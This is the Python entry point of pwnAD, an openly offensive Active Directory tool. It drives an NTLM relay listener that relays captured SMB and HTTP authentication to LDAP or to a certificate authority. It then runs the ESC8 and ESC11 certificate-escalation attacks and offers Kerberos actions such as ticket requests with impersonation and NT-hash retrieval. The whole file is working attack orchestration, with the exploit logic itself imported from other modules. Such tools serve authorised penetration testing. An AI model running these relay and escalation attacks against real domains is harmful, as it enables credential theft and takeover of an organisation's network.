import logging
import sys
from pwnAD.lib.auth import Authenticate
from pwnAD.lib.interactive import start_interactive_mode
from pwnAD.lib.utils import execute_action_function
import pwnAD.lib.parser as parser
import pwnAD.lib.logger as logger


def _run_relay_mode(options):
    """Start NTLM relay mode: listen for incoming auth, relay to target, inject into pwnAD."""
    from pwnAD.lib.relay import RelayManager, handle_relay_session, exploit_esc8, exploit_esc11

    if not options.relay_target:
        logging.error('Relay mode requires a target: --relay -t ldaps://dc01.domain.local')
        sys.exit(1)

    target = options.relay_target

    manager = RelayManager(
        target=target,
        listen_host=options.relay_host,
        smb_port=options.smb_port,
        http_port=options.http_port,
        disable_smb=options.relay_no_smb,
        disable_http=options.relay_no_http,
        domain=getattr(options, 'domain', None),
        adcs_template=getattr(options, 'relay_template', None),
        adcs_ca=getattr(options, 'relay_ca', None),
        adcs_alt_name=getattr(options, 'relay_alt_name', None),
    )

    manager.start()
    logging.info('[*] Waiting for incoming connections...')

    try:
        while True:
            session = manager.get_session(timeout=2)
            if session is None:
                continue

            sess_type = session['type']
            user = f"{session.get('domain', '?')}\\{session.get('username', '?')}"

            if sess_type == 'ldap':
                logging.info(f'[+] LDAP session from {user}')
                conn = handle_relay_session(session, domain=getattr(options, 'domain', None))
                if options.web:
                    from pwnAD.web.app import start_web
                    start_web(conn, host=options.web_host, port=options.web_port)
                    break
                else:
                    start_interactive_mode(conn)
                    break

            elif sess_type == 'http':
                logging.info(f'[+] HTTP session from {user} - running ESC8')
                ca_name = getattr(options, 'relay_ca', None) or 'CA'
                template = getattr(options, 'relay_template', None)
                alt_name = getattr(options, 'relay_alt_name', None)
                try:
                    pfx_path, cert, key = exploit_esc8(
                        session['client'], ca_name=ca_name,
                        template=template, alt_name=alt_name,
                    )
                    logging.info(f'[+] ESC8 complete: {pfx_path}')
                except Exception as e:
                    logging.error(f'[-] ESC8 failed: {e}')

            elif sess_type == 'rpc':
                logging.info(f'[+] RPC session from {user} - running ESC11')
                ca_name = getattr(options, 'relay_ca', None)
                if not ca_name:
                    logging.error('[-] ESC11 requires --relay-ca')
                    continue
                template = getattr(options, 'relay_template', None)
                alt_name = getattr(options, 'relay_alt_name', None)
                try:
                    pfx_path, cert, key = exploit_esc11(
                        session['dce'], ca_name=ca_name,
                        template=template, alt_name=alt_name,
                    )
                    logging.info(f'[+] ESC11 complete: {pfx_path}')
                except Exception as e:
                    logging.error(f'[-] ESC11 failed: {e}')

    except KeyboardInterrupt:
        logging.info('[*] Relay stopped by user')
    finally:
        manager.stop()



def main():
    logger.init()

    options, action_parsers = parser.parseArgs()
    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    # Relay mode — no LDAP auth needed, relay handles auth
    if getattr(options, 'relay', False):
        _run_relay_mode(options)
        return

    if options.dc_ip is None:
        return "You need to specify a target with --dc-ip"

    # Check if action requires a function
    if not options.interactive and not options.web:
        if options.action is None:
            logging.error("No action has been specified, use --help for more information")
            sys.exit(-1)
        elif options.action in action_parsers and options.function is None:
            # Action specified but no function - show help for that action
            action_parsers[options.action].print_help()
            sys.exit(-1)

    authenticate_kwargs = {}
    if options.action == "getTGT":
        authenticate_kwargs = {
            'principalType' : options.principalType,
            'spn' : options.spn
        }
    elif options.action == "getST":
        authenticate_kwargs = {
            'spn' : options.spn,
            'altservice' : options.altservice,
            'impersonate' : options.impersonate,
            'additional_ticket' : options.additional_ticket,
            'u2u' : options.u2u,
            'no_s4u2proxy' : options.no_s4u2proxy,
            'force_forwardable' : options.force_forwardable,
            'renew' : options.renew
        }
    try:
        authenticate = Authenticate(
            domain=options.domain,
            dc_ip=options.dc_ip,
            username=options.username,
            password=options.password,
            hashes=options.hashes,
            aesKey=options.aesKey,
            pfx=options.pfx,
            pfx_pass=options.pfx_pass,
            key=options.key,
            cert=options.cert,
            use_kerberos=options.use_kerberos,
            kdcHost=options.kdcHost,
            _do_tls=options._do_tls,
            port=options.port,
            **authenticate_kwargs
        )
    except ValueError as e:
        logging.error(f"Authentication failed: {e}")
        return 

    if options.action in ["getTGT", "getST", "getNThash", "getPFX"]:
        try:
            if options.domain is None:
                return logging.error("You need to specify a domain.")
            authenticate.kerberos_authentication()
            logging.debug(f"Executing action : {options.action}")
            execute_action_function(options, authenticate)

        except (ValueError, ConnectionError) as e:
            logging.error(f"Authentication/Connection error: {e}")
        except KeyboardInterrupt:
            logging.info("Operation cancelled by user")
        except Exception as e:
            logging.error(f"Unexpected error: {e}")
            logging.debug(f"Full traceback:", exc_info=True)
        
    
    else:
        logging.debug(f"Trying authentication as {options.username} on {options.dc_ip} ... ")
        try:
            connection = authenticate.ldap_authentication()
            logging.debug("Finishing authentication, starting action now")

            if options.web:
                from pwnAD.web.app import start_web
                start_web(connection, host=options.web_host, port=options.web_port)
            elif options.interactive:
                start_interactive_mode(connection)
            else:
                execute_action_function(options, connection)

        except (ValueError, ConnectionError) as e:
            logging.error(f"Authentication/Connection error: {e}")
        except KeyboardInterrupt:
            logging.info("Operation cancelled by user")
        except Exception as e:
            logging.error(f"Unexpected error: {e}")
            logging.debug(f"Full traceback:", exc_info=True)

if __name__ == "__main__":
    main()